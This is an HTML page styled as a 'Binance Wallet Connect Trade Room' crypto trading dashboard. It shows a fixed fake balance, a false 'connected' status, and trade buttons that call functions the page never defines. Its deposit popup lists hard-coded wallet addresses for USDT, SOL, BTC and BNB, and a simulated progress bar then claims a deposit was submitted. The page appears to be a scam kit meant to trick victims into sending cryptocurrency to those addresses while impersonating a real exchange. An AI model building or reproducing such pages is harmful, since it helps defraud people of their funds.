<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Binance Wallet Connect Trade Room</title>
<link rel="stylesheet" href="style.css">

<style>

/* ================= SIGNAL + CHART ================= */

.signal{
  margin:14px;
  background:var(--bg-card-2);
  border-radius:16px;
  padding:14px;
  color:var(--text-main);
}

.signal-top{
  display:flex;
  justify-content:space-between;
}

.price .p{
  font-size:18px;
  font-weight:bold;
}

.chg.up{ color:var(--green); }
.chg.down{ color:var(--red); }

/* ================= CHART ================= */

.chartWrap{
  margin:14px;
  background:var(--bg-card-2);
  border-radius:18px;
  overflow:hidden;
}

canvas{
  width:100%;
  height:320px;
  display:block;
}

/* ================= BALANCE ================= */

#balance{
  font-size:28px;
  font-weight:700;
  font-variant-numeric: tabular-nums;
  margin:6px 0;
  transition:.3s;
}

.balance-up{ color:var(--green); }
.balance-down{ color:var(--red); }

/* ================= HISTORY ================= */

.history-card{
  margin:14px;
  padding:12px;
  background:var(--bg-card-2);
  border-radius:12px;
}

/* ================= POPUP ================= */

.popup{
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,.7);
  display:none;
  justify-content:center;
  align-items:center;
  z-index:999;
}

.popup-box{
  background:var(--bg-card);
  padding:20px;
  width:90%;
  max-width:400px;
  border-radius:12px;
  text-align:center;
  color:var(--text-main);
}

.wallet-box{
  display:flex;
  justify-content:space-between;
  align-items:center;
  background:var(--bg-card-2);
  padding:8px;
  border-radius:6px;
  margin-bottom:10px;
  font-size:12px;
  word-break:break-all;
}

.copy-btn{
  cursor:pointer;
  font-size:14px;
}

/* ================= PROGRESS ================= */

.deposit-progress-container{
  position:relative;
  width:100%;
  height:20px;
  background:var(--bg-card-2);
  border-radius:10px;
  overflow:hidden;
  margin:10px 0;
}

.deposit-progress-bar{
  height:100%;
  width:0%;
  background:var(--green);
  border-radius:10px 0 0 10px;
  transition:width 0.2s linear;
  text-align:center;
  color:#fff;
  font-size:12px;
  line-height:20px;
}

/* ================= BUTTONS ================= */

.btn-group,
.trade-controls{
  display:flex;
  gap:12px;
  margin:14px;
}

.btn,
.trade-controls button{
  flex:1;
  padding:12px;
  border-radius:8px;
  font-weight:600;
  cursor:pointer;
  border:none;
  transition:.2s;
}

.btn-yellow{
  background:var(--yellow);
  color:#000;
}

.btn-dark{
  background:var(--bg-card);
  color:var(--text-main);
  border:1px solid var(--border);
}

.btn-dark:hover{
  background:var(--bg-card-2);
}

/* ================= LOADER ================= */

.loader{
  position:fixed;
  inset:0;
  background:rgba(11,14,17,.95);
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  z-index:9999;
}

.loader p{
  margin-top:12px;
  font-size:14px;
  color:var(--text-muted);
}

.hidden{
  display:none;
}

.spinner{
  width:42px;
  height:42px;
  border:3px solid var(--border);
  border-top:3px solid var(--yellow);
  border-radius:50%;
  animation:spin .8s linear infinite;
}

@keyframes spin{
  to{transform:rotate(360deg);}
}

</style>
</head>

<body class="dark">

<header class="header">
<div class="logo">TradeRoom</div>

<p>
SOL: 9PMiUwH1wsZj8ja98B3V6pNGSzt2ZaKU9t2c814JhQxm<br>
STATUS (connected)
</p>

<button id="themeToggle" class="theme-btn"></button>
</header>


<div class="balance-card">
<div class="balance-title">Total Balance:</div>
<div id="balance">$500.07</div>
</div>


<div class="trade-controls">

<button onclick="startStopTrade()" class="btn-yellow">
Start / Stop Trade
</button>

<button onclick="cancelTrade()" class="btn-dark">
CANCEL Trade
</button>

<button onclick="openLiquidation()" class="btn-dark">
Liquidation Signal
</button>

<select id="pair" class="btn-dark">
<option>SOL/USDT</option>
<option>ETH/USDT</option>
<option>BTC/USDT</option>
<option>ADA/USDT</option>
<option>XRP/USDT</option>
<option>DOGE/USDT</option>
<option>DOT/USDT</option>
<option>LTC/USDT</option>
<option>AVAX/USDT</option>
<option>TRX/USDT</option>
</select>

</div>


<div class="chartWrap">
<canvas id="chart"></canvas>
</div>


<div class="balance-card">

<h3>Deposit (Advanced Fixed Deposit Security)</h3>

<h4>
Fixed Capital:$500.07 [2'Net Capital $340]
</h4>

<button class="btn-yellow" onclick="openDeposit()">
Make Deposit
</button>

</div>


<div class="popup" id="depositPopup">

<div class="popup-box">

<h3>Select Network</h3>

<select id="networkSelect" onchange="updateWallet()">

<option value="USDT-ERC20">USDT (ERC20)</option>
<option value="USDT-TRC20">USDT (TRC20)</option>
<option value="SOL">SOL</option>
<option value="BTC">BTC</option>
<option value="BNB">BNB</option>

</select>

<div class="wallet-box">

<span id="walletAddress"></span>

<span class="copy-btn" onclick="copyWallet()">📋</span>

</div>

<input type="number" id="depositAmount" placeholder="Enter amount">

<button onclick="confirmDeposit()" class="btn-yellow">
Confirm Deposit
</button>

<div class="deposit-progress-container">
<div class="deposit-progress-bar" id="depositProgressBar">0%</div>
</div>

<button onclick="closeDeposit()" class="btn-dark">
Close
</button>

</div>

</div>


<div id="loader" class="loader hidden">
<div class="spinner"></div>
<p>Redirecting...</p>
</div>


<script>

/* ================= WALLET ADDRESSES ================= */

const wallets = {

"USDT-ERC20":"0x8F7a3c5A9E14D3B9c4F1E21b4dF9027B2c6A9e12",

"USDT-TRC20":"TQ9sR1WnYhX7eDkP4L8fA5zC2gM7tVbH6Q",

"SOL":"9PMiUwH1wsZj8ja98B3V6pNGSzt2ZaKU9t2c814JhQxm",

"BTC":"bc1q7d8f9a3s6k4p2t5m9x0c1b8n7v4y6z3q2w1e5",

"BNB":"bnb1p4t3m9k2c8x7q5v6n1w0z4y8r6s3d2f7h9j4k"

};


/* ================= WALLET UPDATE ================= */

function updateWallet(){

let network=document.getElementById("networkSelect").value;

document.getElementById("walletAddress").textContent=wallets[network];

}


/* ================= COPY WALLET ================= */

function copyWallet(){

let text=document.getElementById("walletAddress").textContent;

navigator.clipboard.writeText(text);

alert("Wallet address copied");

}


/* ================= OPEN / CLOSE ================= */

function openDeposit(){

document.getElementById("depositPopup").style.display="flex";

updateWallet();

}

function closeDeposit(){

document.getElementById("depositPopup").style.display="none";

}


/* ================= PROGRESS ================= */

function confirmDeposit(){

let amount=document.getElementById("depositAmount").value;

if(amount=="" || amount<=0){

alert("Enter deposit amount");

return;

}

let bar=document.getElementById("depositProgressBar");

let progress=0;

let timer=setInterval(()=>{

progress+=2;

bar.style.width=progress+"%";

bar.innerText=progress+"%";

if(progress>=100){

clearInterval(timer);

alert("Deposit request submitted");

}

},80);

}


/* ================= REDIRECT ================= */

function redirectWithLoader(page){

document.getElementById("loader").classList.remove("hidden");

setTimeout(()=>{

window.location.href="./"+page;

},1200);

}

</script>

</body>
</html>
